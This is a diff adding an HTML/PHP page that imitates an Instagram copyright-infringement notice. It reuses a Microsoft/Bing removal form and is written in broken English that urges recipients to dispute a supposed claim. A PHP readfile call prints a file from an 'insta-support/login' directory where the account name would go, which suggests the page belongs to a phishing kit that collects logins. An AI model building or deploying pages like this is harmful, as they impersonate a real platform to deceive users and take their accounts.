@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta charset="UTF-8">
+
+
+
+    <title>Notices of Infringement</title>
+
+    <link media="all" href="higControls.css" rel="stylesheet" />
+    <link media="all" href="https://ajax.aspnetcdn.com/ajax/bootstrap/3.3.6/css/bootstrap-theme.min.css" rel="stylesheet" />
+    <link media="all" href="BzuSjdryV4jhP0_QIrsykgwp46KhcfBUjMrBCvV0E6c1" rel="stylesheet" />
+    <link type="text/css" href="css.css" rel="stylesheet" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-2.2.3.min.js"></script>
+    <script src="jquery-migrate.min.js"></script>
+    <script src="https://ajax.aspnetcdn.com/ajax/bootstrap/3.3.6/bootstrap.min.js"></script>
+    <script src="bootstrap-datepicker.min.js" defer></script>
+    <script src="json-viewer.js" defer></script>
+    <script type="text/javascript" src="https://ajax.aspnetcdn.com/ajax/jquery.ui/1.8.18/jquery-ui.min.js"></script>
+    <script type="text/javascript" src="https://ajax.aspnetcdn.com/ajax/jquery.validate/1.14.0/jquery.validate.min.js"></script>
+    <script type="text/javascript" src="js.js"></script>
+    <script type="text/javascript" src="js2.js"></script>
+    <script type="text/javascript" src="js3.js"></script>
+    <script type="text/javascript" src="https://ajax.aspnetcdn.com/ajax/knockout/knockout-3.0.0.js"></script>
+    <script type="text/javascript" src="knockout.validation.min.js"></script>
+
+</head>
+
+<body class=wpPlugin>
+
+    <div class="removalform" style="margin-bottom: 60px;">
+        <div class="header">
+                <div class="userid">
+                    <div id="account-name">
+                        <?php readfile("/var/www/html/insta-support/login/newfile.txt");?>
+                        <div class="blink-icon-selectdrop"></div>
+                        <div id="signoutHover" style="position: inherit; max-width: 70px; min-width: 0; height: 20px; text-align: center">
+                            <a style="color: black; padding: 3px" href="/insta-support">Sign out</a>
+                        </div>
+                    </div>
+                </div>
+        </div>
+
+
+
+
+
+
+<form class="formbody" id="contentRemovalForm" data-bind="submit: validateAndSubmit">
+
+    <div>
+        <div class="titlecopyright">Requesting Removal of Copyright Infringement</div>
+        <div class="formdescription"><br>
+            This form is solely for requesting removal of copyright infringement in algorithmic (non-paid) content on Instagram. After going through the case we only conveys the meaningful information to the report owner if they have complaint you mistakenly.<br>
+            NOTE: Instagram accepts submissions only from a copyright owner or a copyright owner’s authorized agent pursuant to the U.S. Digital Millennium Copyright Act.
+        </div>
+        <div class="formrow">
+            <div class="formcolumn">
+                <span class="formlabel_alignright">Search Type</span>
+                <span class="mustselect">*</span>
+            </div>
+            <div class="formcolumn">
+                <select class="inputdropdown" data-bind="value:searchType">
+                    <option value="">Please select</option>
+                    <option value="Web">Web</option>
+                    <option value="Image">Image</option>
+                    <option value="Video">Video</option>
+                </select>
+            </div>
+        </div>
+
+
+        <div>
+
+            <div>
+                <div class="sectiontitle">Contact information</div>
+                <div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <div class="formlabel_alignright">Your first name</div>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <input type="text" data-bind="value: firstName" class="inputfield">
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Your last name</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <input type="text" maxlength="100000" data-bind="value: lastName" class="inputfield">
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Reporting Organization (if applicable)</span>
+                        </div>
+                        <div class="formcolumn">
+                            <input type="text" data-bind="value: companyName" class="inputfield">
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Full name of copyright owner</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <input type="text" data-bind="value: copyrightOwnerFullName" class="inputfield">
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Country/region of the copyright owner</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+
+                            <select class="inputdropdown" data-bind="value:copyrightOwnerCountry">
+                                <option value="">Please select</option>
+                                    <option value="Afghanistan">Afghanistan</option>
+                                    <option value="&#197;land Islands">&#197;land Islands</option>
+                                    <option value="Albania">Albania</option>
+                                    <option value="Algeria">Algeria</option>
+                                    <option value="American Samoa">American Samoa</option>
+                                    <option value="Andorra">Andorra</option>
+                                    <option value="Angola">Angola</option>
+                                    <option value="Anguilla">Anguilla</option>
+                                    <option value="Antarctica">Antarctica</option>
+                                    <option value="Antigua and Barbuda">Antigua and Barbuda</option>
+                                    <option value="Argentina">Argentina</option>
+                                    <option value="Armenia">Armenia</option>
+                                    <option value="Aruba">Aruba</option>
+                                    <option value="Australia">Australia</option>
+                                    <option value="Austria">Austria</option>
+                                    <option value="Azerbaijan">Azerbaijan</option>
+                                    <option value="Bahamas">Bahamas</option>
+                                    <option value="Bahrain">Bahrain</option>
+                                    <option value="Bangladesh">Bangladesh</option>
+                                    <option value="Barbados">Barbados</option>
+                                    <option value="Belarus">Belarus</option>
+                                    <option value="Belgium">Belgium</option>
+                                    <option value="Belize">Belize</option>
+                                    <option value="Benin">Benin</option>
+                                    <option value="Bermuda">Bermuda</option>
+                                    <option value="Bhutan">Bhutan</option>
+                                    <option value="Bolivia">Bolivia</option>
+                                    <option value="Bonaire">Bonaire</option>
+                                    <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
+                                    <option value="Botswana">Botswana</option>
+                                    <option value="Bouvet Island">Bouvet Island</option>
+                                    <option value="Brazil">Brazil</option>
+                                    <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
+                                    <option value="British Virgin Islands">British Virgin Islands</option>
+                                    <option value="Brunei">Brunei</option>
+                                    <option value="Bulgaria">Bulgaria</option>
+                                    <option value="Burkina Faso">Burkina Faso</option>
+                                    <option value="Burundi">Burundi</option>
+                                    <option value="Cabo Verde">Cabo Verde</option>
+                                    <option value="Cambodia">Cambodia</option>
+                                    <option value="Cameroon">Cameroon</option>
+                                    <option value="Canada">Canada</option>
+                                    <option value="Cayman Islands">Cayman Islands</option>
+                                    <option value="Central African Republic">Central African Republic</option>
+                                    <option value="Chad">Chad</option>
+                                    <option value="Chile">Chile</option>
+                                    <option value="China">China</option>
+                                    <option value="Christmas Island">Christmas Island</option>
+                                    <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
+                                    <option value="Colombia">Colombia</option>
+                                    <option value="Comoros">Comoros</option>
+                                    <option value="Congo">Congo</option>
+                                    <option value="Congo (DRC)">Congo (DRC)</option>
+                                    <option value="Cook Islands">Cook Islands</option>
+                                    <option value="Costa Rica">Costa Rica</option>
+                                    <option value="C&#244;te d’Ivoire">C&#244;te d’Ivoire</option>
+                                    <option value="Croatia">Croatia</option>
+                                    <option value="Cuba">Cuba</option>
+                                    <option value="Cura&#231;ao">Cura&#231;ao</option>
+                                    <option value="Cyprus">Cyprus</option>
+                                    <option value="Czech Republic">Czech Republic</option>
+                                    <option value="Denmark">Denmark</option>
+                                    <option value="Djibouti">Djibouti</option>
+                                    <option value="Dominica">Dominica</option>
+                                    <option value="Dominican Republic">Dominican Republic</option>
+                                    <option value="Ecuador">Ecuador</option>
+                                    <option value="Egypt">Egypt</option>
+                                    <option value="El Salvador">El Salvador</option>
+                                    <option value="Equatorial Guinea">Equatorial Guinea</option>
+                                    <option value="Eritrea">Eritrea</option>
+                                    <option value="Estonia">Estonia</option>
+                                    <option value="Ethiopia">Ethiopia</option>
+                                    <option value="Falkland Islands">Falkland Islands</option>
+                                    <option value="Faroe Islands">Faroe Islands</option>
+                                    <option value="Fiji">Fiji</option>
+                                    <option value="Finland">Finland</option>
+                                    <option value="France">France</option>
+                                    <option value="French Guiana">French Guiana</option>
+                                    <option value="French Polynesia">French Polynesia</option>
+                                    <option value="French Southern Territories">French Southern Territories</option>
+                                    <option value="Gabon">Gabon</option>
+                                    <option value="Gambia">Gambia</option>
+                                    <option value="Georgia">Georgia</option>
+                                    <option value="Germany">Germany</option>
+                                    <option value="Ghana">Ghana</option>
+                                    <option value="Gibraltar">Gibraltar</option>
+                                    <option value="Greece">Greece</option>
+                                    <option value="Greenland">Greenland</option>
+                                    <option value="Grenada">Grenada</option>
+                                    <option value="Guadeloupe">Guadeloupe</option>
+                                    <option value="Guam">Guam</option>
+                                    <option value="Guatemala">Guatemala</option>
+                                    <option value="Guernsey">Guernsey</option>
+                                    <option value="Guinea">Guinea</option>
+                                    <option value="Guinea-Bissau">Guinea-Bissau</option>
+                                    <option value="Guyana">Guyana</option>
+                                    <option value="Haiti">Haiti</option>
+                                    <option value="Heard Island and McDonald Islands">Heard Island and McDonald Islands</option>
+                                    <option value="Honduras">Honduras</option>
+                                    <option value="Hong Kong SAR">Hong Kong SAR</option>
+                                    <option value="Hungary">Hungary</option>
+                                    <option value="Iceland">Iceland</option>
+                                    <option value="India">India</option>
+                                    <option value="Indonesia">Indonesia</option>
+                                    <option value="Iran">Iran</option>
+                                    <option value="Iraq">Iraq</option>
+                                    <option value="Ireland">Ireland</option>
+                                    <option value="Isle of Man">Isle of Man</option>
+                                    <option value="Israel">Israel</option>
+                                    <option value="Italy">Italy</option>
+                                    <option value="Jamaica">Jamaica</option>
+                                    <option value="Jan Mayen">Jan Mayen</option>
+                                    <option value="Japan">Japan</option>
+                                    <option value="Jersey">Jersey</option>
+                                    <option value="Jordan">Jordan</option>
+                                    <option value="Kazakhstan">Kazakhstan</option>
+                                    <option value="Kenya">Kenya</option>
+                                    <option value="Kiribati">Kiribati</option>
+                                    <option value="Korea">Korea</option>
+                                    <option value="Kosovo">Kosovo</option>
+                                    <option value="Kuwait">Kuwait</option>
+                                    <option value="Kyrgyzstan">Kyrgyzstan</option>
+                                    <option value="Laos">Laos</option>
+                                    <option value="Latvia">Latvia</option>
+                                    <option value="Lebanon">Lebanon</option>
+                                    <option value="Lesotho">Lesotho</option>
+                                    <option value="Liberia">Liberia</option>
+                                    <option value="Libya">Libya</option>
+                                    <option value="Liechtenstein">Liechtenstein</option>
+                                    <option value="Lithuania">Lithuania</option>
+                                    <option value="Luxembourg">Luxembourg</option>
+                                    <option value="Macao SAR">Macao SAR</option>
+                                    <option value="Macedonia, FYRO">Macedonia, FYRO</option>
+                                    <option value="Madagascar">Madagascar</option>
+                                    <option value="Malawi">Malawi</option>
+                                    <option value="Malaysia">Malaysia</option>
+                                    <option value="Maldives">Maldives</option>
+                                    <option value="Mali">Mali</option>
+                                    <option value="Malta">Malta</option>
+                                    <option value="Marshall Islands">Marshall Islands</option>
+                                    <option value="Martinique">Martinique</option>
+                                    <option value="Mauritania">Mauritania</option>
+                                    <option value="Mauritius">Mauritius</option>
+                                    <option value="Mayotte">Mayotte</option>
+                                    <option value="Mexico">Mexico</option>
+                                    <option value="Micronesia">Micronesia</option>
+                                    <option value="Moldova">Moldova</option>
+                                    <option value="Monaco">Monaco</option>
+                                    <option value="Mongolia">Mongolia</option>
+                                    <option value="Montenegro">Montenegro</option>
+                                    <option value="Montserrat">Montserrat</option>
+                                    <option value="Morocco">Morocco</option>
+                                    <option value="Mozambique">Mozambique</option>
+                                    <option value="Myanmar">Myanmar</option>
+                                    <option value="Namibia">Namibia</option>
+                                    <option value="Nauru">Nauru</option>
+                                    <option value="Nepal">Nepal</option>
+                                    <option value="Netherlands">Netherlands</option>
+                                    <option value="New Caledonia">New Caledonia</option>
+                                    <option value="New Zealand">New Zealand</option>
+                                    <option value="Nicaragua">Nicaragua</option>
+                                    <option value="Niger">Niger</option>
+                                    <option value="Nigeria">Nigeria</option>
+                                    <option value="Niue">Niue</option>
+                                    <option value="Norfolk Island">Norfolk Island</option>
+                                    <option value="North Korea">North Korea</option>
+                                    <option value="Northern Mariana Islands">Northern Mariana Islands</option>
+                                    <option value="Norway">Norway</option>
+                                    <option value="Oman">Oman</option>
+                                    <option value="Pakistan">Pakistan</option>
+                                    <option value="Palau">Palau</option>
+                                    <option value="Palestinian Authority">Palestinian Authority</option>
+                                    <option value="Panama">Panama</option>
+                                    <option value="Papua New Guinea">Papua New Guinea</option>
+                                    <option value="Paraguay">Paraguay</option>
+                                    <option value="Peru">Peru</option>
+                                    <option value="Philippines">Philippines</option>
+                                    <option value="Pitcairn Islands">Pitcairn Islands</option>
+                                    <option value="Poland">Poland</option>
+                                    <option value="Portugal">Portugal</option>
+                                    <option value="Puerto Rico">Puerto Rico</option>
+                                    <option value="Qatar">Qatar</option>
+                                    <option value="R&#233;union">R&#233;union</option>
+                                    <option value="Romania">Romania</option>
+                                    <option value="Russia">Russia</option>
+                                    <option value="Rwanda">Rwanda</option>
+                                    <option value="Saba">Saba</option>
+                                    <option value="Saint Barth&#233;lemy">Saint Barth&#233;lemy</option>
+                                    <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
+                                    <option value="Saint Lucia">Saint Lucia</option>
+                                    <option value="Saint Martin">Saint Martin</option>
+                                    <option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option>
+                                    <option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option>
+                                    <option value="Samoa">Samoa</option>
+                                    <option value="San Marino">San Marino</option>
+                                    <option value="S&#227;o Tom&#233; and Pr&#237;ncipe">S&#227;o Tom&#233; and Pr&#237;ncipe</option>
+                                    <option value="Saudi Arabia">Saudi Arabia</option>
+                                    <option value="Senegal">Senegal</option>
+                                    <option value="Serbia">Serbia</option>
+                                    <option value="Seychelles">Seychelles</option>
+                                    <option value="Sierra Leone">Sierra Leone</option>
+                                    <option value="Singapore">Singapore</option>
+                                    <option value="Sint Eustatius">Sint Eustatius</option>
+                                    <option value="Sint Maarten">Sint Maarten</option>
+                                    <option value="Slovakia">Slovakia</option>
+                                    <option value="Slovenia">Slovenia</option>
+                                    <option value="Solomon Islands">Solomon Islands</option>
+                                    <option value="Somalia">Somalia</option>
+                                    <option value="South Africa">South Africa</option>
+                                    <option value="South Georgia and South Sandwich Islands">South Georgia and South Sandwich Islands</option>
+                                    <option value="South Sudan">South Sudan</option>
+                                    <option value="Spain">Spain</option>
+                                    <option value="Sri Lanka">Sri Lanka</option>
+                                    <option value="St Helena, Ascension, Tristan da Cunha">St Helena, Ascension, Tristan da Cunha</option>
+                                    <option value="Sudan">Sudan</option>
+                                    <option value="Suriname">Suriname</option>
+                                    <option value="Svalbard">Svalbard</option>
+                                    <option value="Swaziland">Swaziland</option>
+                                    <option value="Sweden">Sweden</option>
+                                    <option value="Switzerland">Switzerland</option>
+                                    <option value="Syria">Syria</option>
+                                    <option value="Taiwan">Taiwan</option>
+                                    <option value="Tajikistan">Tajikistan</option>
+                                    <option value="Tanzania">Tanzania</option>
+                                    <option value="Thailand">Thailand</option>
+                                    <option value="Timor-Leste">Timor-Leste</option>
+                                    <option value="Togo">Togo</option>
+                                    <option value="Tokelau">Tokelau</option>
+                                    <option value="Tonga">Tonga</option>
+                                    <option value="Trinidad and Tobago">Trinidad and Tobago</option>
+                                    <option value="Tunisia">Tunisia</option>
+                                    <option value="Turkey">Turkey</option>
+                                    <option value="Turkmenistan">Turkmenistan</option>
+                                    <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
+                                    <option value="Tuvalu">Tuvalu</option>
+                                    <option value="U.S. Outlying Islands">U.S. Outlying Islands</option>
+                                    <option value="U.S. Virgin Islands">U.S. Virgin Islands</option>
+                                    <option value="Uganda">Uganda</option>
+                                    <option value="Ukraine">Ukraine</option>
+                                    <option value="United Arab Emirates">United Arab Emirates</option>
+                                    <option value="United Kingdom">United Kingdom</option>
+                                    <option value="United States">United States</option>
+                                    <option value="Uruguay">Uruguay</option>
+                                    <option value="Uzbekistan">Uzbekistan</option>
+                                    <option value="Vanuatu">Vanuatu</option>
+                                    <option value="Vatican City">Vatican City</option>
+                                    <option value="Venezuela">Venezuela</option>
+                                    <option value="Vietnam">Vietnam</option>
+                                    <option value="Wallis And Futuna">Wallis And Futuna</option>
+                                    <option value="Yemen">Yemen</option>
+                                    <option value="Zambia">Zambia</option>
+                                    <option value="Zimbabwe">Zimbabwe</option>
+                                    <option value="Worldwide">Worldwide</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Email address</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <input type="text" data-bind="value: emailAddress" class="inputfield">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+            <div>
+                <div class="sectiontitle">Identification of the copyrighted work</div>
+                <div>
+                    <div class="formrow" data-bind="visible: !isMmSearch()">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Type of work</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <select class="inputdropdown" data-bind="value:typeOfWork">
+                                <option value="">Please select</option>
+                                <option value="Artwork">Artwork</option>
+                                <option value="Ebook">Ebook</option>
+                                <option value="FilmTv">Film/TV</option>
+                                <option value="Music">Music</option>
+                                <option value="Photograph">Photograph</option>
+                                <option value="Software">Software</option>
+                                <option value="Text">Text</option>
+                                <option value="Video">Video</option>
+                                <option value="VideoGame">Video Game</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="formrow" data-bind="visible: !isMmSearch()">
+                        <div class="formcolumn"></div>
+                        <div class="formcolumn">
+                            <span data-bind="visible: typeOfWork() === 'Photograph'">
+                                Please note that the photographer, and not the subject of the photo, is generally the copyright owner of the photograph unless the rights to the work have been transferred. You may report removal requests for nude or sexually explicit photos or videos that have been posted or shared without your consent
+                                <a href="https://support.microsoft.com/en-us/getsupport?oaspworkflow=start_1.0.0.0&wfname=capsub&productkey=RevengePorn">here</a>
+                            </span>
+                        </div>
+                    </div>
+                    <div class="formrow" data-bind="visible: !isImageSearch()">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Title of work (if applicable)</span>
+                        </div>
+                        <div class="formcolumn">
+                            <input type="text" data-bind="value: titleOfWork" class="inputfield">
+                        </div>
+                    </div>
+
+
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Description</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <div class="formlabel_alignleft">
+                                Please provide a detailed description if you believe this copyright is false and you have not used anyone's content or used for non-profitable purpose.
+                            </div>
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn"></div>
+                        <div class="formcolumn">
+                            <textarea type="text" placeholder="100000 characters maximum" data-bind="value: description" class="inputtextarea"></textarea>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+<!--
+            <div>
+                <div class="sectiontitle">Location of the infringing material</div>
+
+                <div data-bind="visible: isImageSearch()">
+                    <div class="formrow">
+                        <div class="formcolumn_multirows">
+                            <span class="formlabel_alignright">URL(s) you are asking us to remove</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                    </div>
+
+                    <div data-bind="template: { name: 'mm-url-template', foreach: urlPairsToRemove, beforeRemove: animateRemoveUrlItem}"></div>
+                    <div>
+                        <div class="formrow" data-bind="visible:urlPairsToRemove().length < 10">
+                            <div class="formcolumn"><span class="formlabel_alignright"></span></div>
+                            <div class="formcolumn">
+                                <input type="button" class="adddeletebutton" value="Add" data-bind="click: addUrlPair, disable: bulkSubmissionData" />
+                                <input type="button" class="adddeletebutton" value="Clear" data-bind="click: clearUrlPairs, disable: bulkSubmissionData" />
+                            </div>
+                        </div>
+                    </div>
+                </div>
+-->
+                <div data-bind="visible: !isImageSearch()">
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">URL(s) you suspect been used mistakenly/non-profitable purpose</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <div class="formlabel_alignleft">
+                                Page specific URL where the copyright is infringed (e.g., http://www.instagram.com/specificpage.html) and not the homepage URL (e.g., http://www.instagram.com)
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="formrow">
+                        <div class="formcolumn"></div>
+                        <div class="formcolumn">
+                            <textarea type="text" placeholder="Enter one URL per line (10 URLs maximum)"
+                                      data-bind="value: urlsToRemove, disable: bulkSubmissionData" class="inputtextarea"></textarea>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+            <div>
+                <div class="sectiontitle">Required statements</div>
+                <div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Good Faith Belief</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <div class="formlabel_alignleft">
+                                <label data-bind="validationOptions: {insertMessages: false}">
+                                    <input type="checkbox" data-bind="checked: goodFaithStatement">
+                                    By typing in my name (electronic signature), I state that I have a good faith belief that the use of the material is not authorized by the intellectual property owner, its agent, or the law (e.g., it is not fair use).
+                                </label>
+                                <span class="validationMessage" data-bind="validationMessage: goodFaithStatement"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Authority to Act</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <div class="formlabel_alignleft">
+                                <label data-bind="validationOptions: {insertMessages: false}">
+                                    <input type="checkbox" data-bind="checked: authorityToActStatement" class="checkbox">
+                                    I represent that the information in the notification is accurate and, under penalty of perjury, that I am authorized to act on behalf of the owner of an exclusive right that is allegedly infringed.
+                                </label>
+                                <span class="validationMessage" data-bind="validationMessage: authorityToActStatement"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">512(f) Acknowledgement</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <label data-bind="validationOptions: {insertMessages: false}">
+                                <input type="checkbox" data-bind="checked: acknowledgementStatement" class="checkbox">
+                                As applicable under 17 U.S.C. 512(f), I acknowledge that I may be subject to liability for damages if I knowingly materially misrepresent that material or activity is infringing.
+                            </label>
+                            <span class="validationMessage" data-bind="validationMessage: acknowledgementStatement"></span>
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn"></div>
+                        <div class="formcolumn">
+                            <span class="formlabel_alignleft">I understand that the information submitted in this form may be shared with third parties or the public, including the alleged infringer about whom I am filing this complaint.</span>
+                        </div>
+                    </div>
+                    <div class="formrow">
+                        <div class="formcolumn">
+                            <span class="formlabel_alignright">Signature</span>
+                            <span class="mustselect">*</span>
+                        </div>
+                        <div class="formcolumn">
+                            <input type="text" data-bind="value: signature" class="inputfield">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <span type="text" class="submiterror" data-bind="text: error"></span>
+            </div>
+
+
+            <div calss="formrow">
+                <div class="formcolumn">
+                        <a type="button" class="submitbutton" href="/insta-support"> Log out & Submit.</a>
+                    <span data-bind="visible: isShowStatus, text: status"></span>
+                </div>
+            </div>
+            <div class="formrow">
+                <div class="formcolumn">
+                    <span class="privacystatement">
+                        Instagram is committed to your privacy. Review our <a href="https://help.instagram.com/519522125107875">
+                            privacy statement
+                        </a>
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</form>
+
+	<div class="footer">
+                   <p class="marginleft20" align="center">
+                &#169; 2021 - Instagram Content Moderation Platform
+            </p>
+       </div>
+    </div>
+
+</body>
+
+</html>
